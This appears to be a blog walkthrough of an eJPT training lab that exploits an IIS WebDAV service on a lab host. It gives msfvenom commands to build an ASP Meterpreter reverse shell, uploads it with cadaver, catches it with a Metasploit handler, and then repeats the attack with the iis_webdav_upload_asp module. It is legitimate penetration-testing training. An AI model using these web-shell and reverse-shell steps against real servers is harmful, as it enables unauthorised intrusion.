---
title: "eJPT - Windows IIS Server WebDav Metasplit Walkthrough & Insights"
date: 2025-03-31 00:00:00 - 0500
categories: [ eJPT , Lab , Vulnerability Assessment]
tags: [Footprinting, Easy]
image:
    path: /assets/img/1.gif
---

---

## Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Exploit the WebDAV service and retrieve the flag!

**The following username and password may be used to access the service:**

**Credentials:**
```
Username: bob
Passowrd: password_123321
```
# Tools

- Metasploit
- DAVTest
- Cadaver

Let’s with the lab

---

### Video Walkthrough's

{% include embed/youtube.html id='49SaqHOj_Pc' %}


### Service Enumeration using Nmap:

Started with Nmap to discovery the services that are running on the target

command

```bash
nmap -sV -sC demo.ine.local
```

 Breakdown:

- `-sV`: Enables version detection, which identifies the software version running on open ports.
- `-sC`: Runs default scripts (`default` category from NSE - Nmap Scripting Engine).
- `demo.ine.local`: The target domain or hostname.
![alt text](</assets/img/Pasted image 20250331121134.png>)

![alt text](</assets/img/Pasted image 20250331121152.png>)
Narrowed the Nmap scan to the specific port then also used a script that extract some more information form the specific port and it’s services.

```bash
nmap -sV -sC -p 80 --script=http-enum demo.ine.local
```
![alt text](</assets/img/Pasted image 20250331121229.png>)

![alt text](</assets/img/Pasted image 20250331121308.png>)



### Creating a asp shell using msfconsole

![alt text](</assets/img/Pasted image 20250331121345.png>)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=4444 -f asp > shell.asp
```

**Breakdown:**

- `msfvenom` → A payload generator in **Metasploit**, used to create shellcodes, backdoors, and exploits.
- `-p windows/meterpreter/reverse_tcp` → Specifies the **payload**:
    - `windows/meterpreter/reverse_tcp` → A **Meterpreter** reverse shell payload for Windows.
    - `reverse_tcp` → This means the target machine will **connect back** to the attacker's machine (LHOST).
- `LHOST=<YOUR_IP>` → The attacker's **IP address** (listener machine where the reverse shell will connect).
- `LPORT=4444` → The **port number** the shell will connect back to (default: `4444`).
- `-f asp` → Specifies the **format** of the payload (`asp` for an Active Server Page web shell).
- `> shell.asp` → Saves the generated payload as **`shell.asp`** (which can be uploaded to a vulnerable web server).
### Uploading asp file using cadaver

![alt text](</assets/img/Pasted image 20250331121400.png>)


```bash
cadaver <http://demo.ine.local/webdav>
```

**Breakdown:**
- `cadaver` → A **command-line WebDAV client** used to interact with Web Distributed Authoring and Versioning (**WebDAV**) servers.
- `http://demo.ine.local/webdav` → The **URL of the WebDAV server** you want to connect to.
Start the reverse handler for it

#### **Common Commands in Cadaver (Once Connected)**

After connecting, you can use the following commands:

|Command|Description|
|---|---|
|`ls`|List files in the current directory|
|`cd <dir>`|Change directory|
|`put <file>`|Upload a file to the server|
|`get <file>`|Download a file from the server|
|`delete <file>`|Remove a file from the server|
|`mkdir <dir>`|Create a directory on the WebDAV server|
|`rmdir <dir>`|Remove a directory|
|`exit` or `quit`|Close the connection|

Then run the asp file. and we got the access

![alt text](</assets/img/Pasted image 20250331121445.png>)

```bash
service postgresql start && msfconsole 
use multi/handler/
set payload windows/meterpreter/reverse_tcp
set lhost
set lport 
run
```
**Breakdown:**

- `service postgresql start` → Starts the **PostgreSQL database**, which Metasploit uses to store exploits and sessions.
- `&&` → Ensures that **Metasploit Framework (`msfconsole`)** starts **only if** PostgreSQL starts successfully.
- `msfconsole` → Launches the **Metasploit Framework Console** for running exploits and managing sessions.
- - `use multi/handler` → Loads the **multi-handler** module, which is used to receive incoming connections from exploited machines.
- `/` at the end is unnecessary; it should just be `use multi/handler`.
- - `set payload windows/meterpreter/reverse_tcp` → Configures the listener to handle *Windows Meterpreter reverse shell connections**.
- `reverse_tcp` → The target system will **connect back** to the attacker's system.
- - `set LHOST <YOUR_IP>` → Specifies the **attacker's IP address** (where the reverse shell will connect).
- `set LPORT <YOUR_PORT>` → Defines the **port number** to listen for incoming connections (default: `4444`).
- - Starts the listener to **wait for incoming connections** from the target machine.
- Once the target **executes the payload**, the attacker **gains a Meterpreter session**.

![alt text](</assets/img/Pasted image 20250331121502.png>)
---

## Here the version 2 for the same lab!

This version of Metasploit leverages msfconsole modules to automate and simplify the exploitation process, making it much easier for the end user (attacker).
- **Category**: Exploit Module
- **Purpose**: Uploads a malicious ASP shell to an IIS WebDAV-enabled server, allowing remote command execution.

### Starting the msfconsole

```bash
service postgresql start && msfconsole
```

```bash
serach iis upload
use exploit/windows/iis/iis_webdav_upload_asp
set httpusername 
set httppassword
set rhost
set path
run
```

- **Search for IIS Upload Exploits** – Finds available Metasploit modules for exploiting IIS file uploads.
- **Select the IIS WebDAV Upload Exploit** – Loads an exploit that allows uploading malicious ASP files to a WebDAV-enabled server.
- **Set Authentication Credentials (If Required)** – Provides login details if the server requires authentication.
- **Define the Target Host** – Specifies the IIS server’s IP address.
- **Set the Upload Path** – Chooses the directory where the file will be uploaded.
- **Execute the Exploit** – Uploads the ASP shell and attempts to gain remote code execution on the server.
